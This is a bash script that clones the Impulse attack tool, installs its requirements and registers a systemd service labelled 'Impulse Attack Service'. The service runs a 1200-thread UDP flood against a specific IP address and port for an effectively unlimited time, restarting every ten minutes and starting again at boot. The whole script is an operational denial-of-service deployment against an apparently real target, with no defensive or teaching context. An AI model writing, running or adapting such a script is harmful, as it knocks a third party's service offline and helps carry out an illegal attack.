#!/bin/bash

# 1. Update and Install dependencies
sudo apt update
sudo apt install python3 python3-pip git -y

# 2. Clone the repo (cleaning up old versions if they exist)
rm -rf Impulse
git clone https://github.com/LimerBoy/Impulse
cd Impulse/

# 3. Install requirements with the break-system-packages flag
pip3 install -r requirements.txt --break-system-packages

# 4. Create the systemd service file
# This service runs your specific command
cat <<EOF | sudo tee /etc/systemd/system/impulse2.service
[Unit]
Description=Impulse Attack Service
After=network.target

[Service]
Type=simple
WorkingDirectory=$(pwd)
ExecStart=/usr/bin/python3 impulse.py --target 40.160.20.9:16261 --method UDP --time 99999999 --threads 1200
Restart=always
# This kills the process every 10 minutes, and 'Restart=always' brings it back
RuntimeMaxSec=10min

[Install]
WantedBy=multi-user.target
EOF

# 5. Load and start the service
sudo systemctl daemon-reload
sudo systemctl enable impulse2.service
sudo systemctl restart impulse2.service

echo "Setup complete. impulse2.service is now running and rotating every 10 mins."
